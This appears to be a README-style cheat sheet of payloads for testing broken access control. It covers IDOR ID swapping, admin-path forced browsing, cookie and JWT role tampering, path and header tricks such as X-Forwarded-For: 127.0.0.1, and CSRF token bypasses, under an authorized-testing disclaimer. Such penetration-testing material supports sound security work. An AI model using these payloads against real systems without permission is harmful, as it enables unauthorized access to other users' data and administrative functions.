ğŸš¨ Access Control Testing Payloads & Methods
This repository contains a collection of payloads, techniques, and resources for testing Broken Access Control, which is the #1 vulnerability in the OWASP Top 10 (2021). Use these responsibly and only on systems you own or have explicit permission to test.

1. IDOR & Horizontal Privilege Escalation
Attackers access resources belonging to another user at the same privilege level.

Payloads & Test Cases:

Modify Object IDs in URLs, request bodies, or parameters:

```
GET /api/user/v1/accounts/12345 â†’ GET /api/user/v1/accounts/67890
POST /api/updateUser { "uid": 1001 } â†’ { "uid": 1002 }
Traverse predictable object references:

Increment/Decrement IDs: ?invoice_id=100 â†’ ?invoice_id=101

Brute-force static files: https://site.com/files/report_100.pdf

Common parameter names: id, uid, user_id, account, number, key, file, document, order
```
Use encoded/ hashed IDs:

Decode Base64: ?id=MTIz (decodes to 123)

Decode URL encoding: ?id=%31%32%33

Attempt hash cracking if weak (e.g., MD5, predictable).

Change file or document references:

text
GET /download?file=user1_contract.txt â†’ GET /download?file=user2_contract.txt
2. Vertical Privilege Escalation
Attackers gain functions or access reserved for higher privilege users (e.g., user â†’ admin).

Payloads & Test Cases:

Force Browse Administrative Paths:

text
/admin
/administrator
/dashboard
/manager
/controlpanel
/api/admin/users
/backend
/system
/wp-admin
Modify Privilege Flags in Session/Requests:

Cookie/Token Tampering:

text
Cookie: role=user; admin=false â†’ role=admin; admin=true
JWT Tampering: Change the payload of a JSON Web Token.

Original: {"user":"joe","role":"user"} â†’ Modified: {"user":"joe","role":"admin"}

Use tools like jwt.io or jwt_tool.

Parameter Tampering:

text
POST /api/createUser
{ "username": "attacker", "role": "user" } â†’ { "username": "attacker", "role": "administrator" }
Hidden Form Fields:

text
<input type="hidden" name="isAdmin" value="0"> â†’ Change value to "1"
3. Bypassing Platform-Level Access Controls
These methods try to confuse the access control logic on the server.

Payloads & Test Cases:

HTTP Method Tampering:

Try GET, POST, PUT, DELETE, PATCH, HEAD on restricted endpoints.

Example: If POST /admin/deleteUser is blocked, try GET /admin/deleteUser?userid=123.

Path Traversal & Manipulation:

Add trailing characters:

text
/admin â†’ /admin/
/admin â†’ /admin/.
/admin â†’ /admin../
/admin â†’ /admin..;/
Case variation: /ADMIN, /Admin, /aDmIn

Add extensions: /admin â†’ /admin.php, /admin.json, /admin.aspx

Path confusion: /admin â†’ /admin//, //admin, ./admin

Bypass through Referrer Headers or API Keys:

Add headers that might be trusted incorrectly:

text
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: https://target.com/admin
Add a fake API key parameter: ?access_token=test123 or ?api_key=admin

Parameter Pollution:

Submit duplicate parameters: ?id=your_id&id=other_user_id

Bypass IP-Based Restrictions (if you can control headers):

text
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
4. Function-Level Access Control Bypass
Directly accessing functions without the required interface or workflow.

Payloads & Test Cases:

Direct API Endpoint Access:

Browse as a low-privilege user, identify API calls (via browser DevTools) that perform admin actions, then attempt to call them directly while authenticated as a low-privilege user.

Example: User sees GET /api/user/profile. Try GET /api/admin/listAllUsers.

Bypass Multi-Step Processes:

Skip validation steps by directly calling the final action endpoint.

Example: Process is 1. POST /apply, 2. POST /validate, 3. POST /confirm. Try calling POST /confirm directly with crafted data.

5. CORS & CSRF Misconfigurations
These can lead to unauthorized cross-origin requests or actions.

Payloads & Test Cases:

CORS Misconfiguration Abuse:

Check if the Access-Control-Allow-Origin header reflects a wildcard (*) or your supplied origin.

Send a request with Origin: https://attacker.com and see if it's reflected back.

CSRF Bypass:

If the app relies on a CSRF token tied to a session, try:

Submitting an empty token value: csrf_token=

Removing the parameter entirely.

Using a token from another valid session (if not strictly validated).

6. Special Headers & HTTP Versions
Test with HTTP/2 or HTTP/1.0: Some access control logic might differ between protocol versions.

Use non-standard headers that might be interpreted by middleware or proxies.

ğŸ“ Repository Structure Suggestion
You can organize your GitHub repository like this:

text
/access-control-payloads
â”‚
â”œâ”€â”€ /idor_payloads.txt
â”œâ”€â”€ /vertical_escalation_payloads.txt
â”œâ”€â”€ /path-bypass-payloads.txt
â”œâ”€â”€ /jwt_tampering_examples.json
â”œâ”€â”€ /admin_paths_wordlist.txt
â”œâ”€â”€ /http_method_tampering.txt
â”‚
â”œâ”€â”€ README.md  (This file)
â””â”€â”€ LICENSE
ğŸ” Responsible Disclosure & Legal Notice
âš ï¸ WARNING: This information is for educational purposes, security research, and authorized testing only. Unauthorized testing against systems you do not own is illegal and unethical. Always obtain explicit written permission before testing.

ğŸ”— Additional Resources
OWASP Broken Access Control

PortSwigger - Access Control Vulnerabilities

HackTricks - Authorization Bypass
